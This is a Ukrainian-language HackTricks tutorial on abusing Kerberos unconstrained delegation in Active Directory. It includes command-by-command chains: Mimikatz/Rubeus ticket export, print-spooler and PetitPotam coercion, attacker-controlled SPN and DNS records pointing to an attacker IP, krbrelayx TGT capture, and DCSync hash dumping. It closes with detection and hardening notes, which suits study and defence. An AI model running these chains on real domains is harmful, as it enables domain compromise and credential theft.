# Unconstrained delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Це функція, яку Domain Administrator може призначити будь-якому **Computer** у домені. Після цього щоразу, коли **user входить** на цей Computer, **копія TGT** цього user буде **надіслана всередині TGS**, наданого DC, і **збережена в пам'яті LSASS**. Тому, якщо ви маєте привілеї Administrator на цій машині, ви зможете **дампити квитки та імперсонувати користувачів** на будь-якій машині.

Отже, якщо domain admin увійде на Computer з активованою функцією "Unconstrained Delegation", а ви маєте локальні привілеї local admin на цій машині, ви зможете дампити квиток і імперсонувати Domain Admin у будь-якому місці (domain privesc).

Ви можете **знайти об'єкти Computer із цим атрибутом**, перевіривши, чи атрибут [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) містить [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Це можна зробити за допомогою LDAP-фільтра ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, який використовує powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Завантажте ticket Адміністратора (або користувача-жертви) у пам’ять за допомогою **Mimikatz** або **Rubeus** для **Pass the Ticket**.\
Докладніше: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**Більше інформації про Unconstrained delegation на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

Якщо зловмисник може **скомпрометувати комп’ютер, дозволений для "Unconstrained Delegation"**, він може **обманом змусити** **сервер друку** **автоматично увійти** до нього, **зберігши TGT** у пам’яті сервера.\
Після цього зловмисник може виконати **Pass the Ticket attack, щоб видати себе за** обліковий запис комп’ютера сервера друку.

Щоб змусити сервер друку увійти до будь-якої машини, можна використати [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Якщо TGT отримано від контролера домену, ви можете виконати [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) і отримати всі хеші з DC.\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Інші способи **примусово ініціювати автентифікацію:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Також працює будь-який інший coercion primitive, який змушує жертву автентифікуватися за допомогою **Kerberos** до вашого хоста з unconstrained delegation. У сучасних середовищах це часто означає заміну класичного потоку PrinterBug на **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** або coercion на основі **WebClient/WebDAV**, залежно від того, яка RPC surface доступна.

### Зловживання обліковим записом користувача/служби з unconstrained delegation

Unconstrained delegation **не обмежується об'єктами комп'ютерів**. Обліковий запис **користувача/служби** також можна налаштувати як `TRUSTED_FOR_DELEGATION`. У такому сценарії практична вимога полягає в тому, що обліковий запис має отримувати сервісні квитки Kerberos для **SPN, яким він володіє**.

Це відкриває 2 дуже поширені offensive paths:

1. Ви компрометуєте пароль/хеш **облікового запису користувача** з unconstrained delegation, а потім **додаєте SPN** до цього самого облікового запису.
2. Обліковий запис уже має один або кілька SPN, але один із них вказує на **застаріле/виведене з експлуатації ім'я хоста**; відтворення відсутнього **DNS A record** достатнє, щоб перехопити потік автентифікації без зміни набору SPN.<sup>[[8]](#references)</sup>

Мінімальний Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Нотатки:

- Це особливо корисно, коли principal із **Unconstrained Delegation** є **service account**, а у вас є лише його облікові дані, але немає code execution на приєднаному до домену хості.
- Якщо цільовий користувач уже має **stale SPN**, повторне створення відповідного **DNS record** може бути менш помітним, ніж запис нового SPN в AD.
- Сучасний Linux-centric tradecraft використовує `addspn.py`, `dnstool.py`, `krbrelayx.py` та один coercion primitive; для завершення ланцюжка вам не потрібно працювати з Windows-хостом.

### Зловживання Unconstrained Delegation за допомогою створеного атакувальником комп’ютера

У сучасних доменах часто встановлено `MachineAccountQuota > 0` (типове значення — 10), що дозволяє будь-якому автентифікованому principal створювати до N об’єктів комп’ютерів. Якщо у вас також є привілей токена `SeEnableDelegationPrivilege` (або еквівалентні права), ви можете налаштувати щойно створений комп’ютер як trusted for unconstrained delegation і збирати вхідні TGT із привілейованих систем.<sup>[[1]](#references)</sup>

Загальна послідовність:

1) Створіть комп’ютер, який контролюєте
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Зробити фальшиве hostname доступним для розпізнавання всередині домену
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Увімкнення Unconstrained Delegation на комп’ютері під контролем атакувальника
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Чому це працює: за умови unconstrained delegation LSA на комп’ютері з увімкненою delegation кешує вхідні TGT. Якщо змусити DC або привілейований сервер автентифікуватися на вашому fake host, його машинний TGT буде збережено, і його можна буде експортувати.

4) Запустіть krbrelayx в export mode і підготуйте Kerberos material
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Примусьте DC/сервери автентифікуватися на вашому фальшивому хості
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx зберігатиме файли ccache, коли машина проходитиме автентифікацію, наприклад:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Використайте захоплений TGT машини DC для виконання DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Нотатки та вимоги:

- `MachineAccountQuota > 0` дає змогу непривілейованим користувачам створювати комп'ютери; в іншому разі потрібні явні права.
- Встановлення `TRUSTED_FOR_DELEGATION` на комп'ютері потребує `SeEnableDelegationPrivilege` (або domain admin).
- Забезпечте name resolution для вашого fake host (DNS A record), щоб DC міг звертатися до нього за FQDN.
- Coercion потребує придатного vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN тощо). Якщо можливо, вимкніть їх на DC.
- Якщо для victim account встановлено **"Account is sensitive and cannot be delegated"** або він є учасником **Protected Users**, forwarded TGT не буде включено до service ticket, тому цей ланцюжок не дасть змоги отримати повторно використовуваний TGT.<sup>[[9]](#references)</sup>
- Якщо на authenticating client/server увімкнено **Credential Guard**, Windows блокує **Kerberos unconstrained delegation**, через що з перспективи оператора можуть не спрацювати навіть коректні coercion paths.

Ідеї щодо виявлення та hardening:

- Створюйте alert для Event ID 4741 (створено computer account) і 4742/4738 (змінено computer/user account), коли встановлено UAC `TRUSTED_FOR_DELEGATION`.
- Відстежуйте незвичні додавання DNS A-record у domain zone.
- Слідкуйте за сплесками 4768/4769 з неочікуваних hosts і DC-authentications до non-DC hosts.
- Обмежте `SeEnableDelegationPrivilege` мінімальним набором облікових записів, встановіть `MachineAccountQuota=0`, де це можливо, і вимкніть Print Spooler на DC. Увімкніть LDAP signing і channel binding.

### Mitigation

- Обмежте входи DA/Admin до визначених services
- Встановіть **"Account is sensitive and cannot be delegated"** для privileged accounts.

## References

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
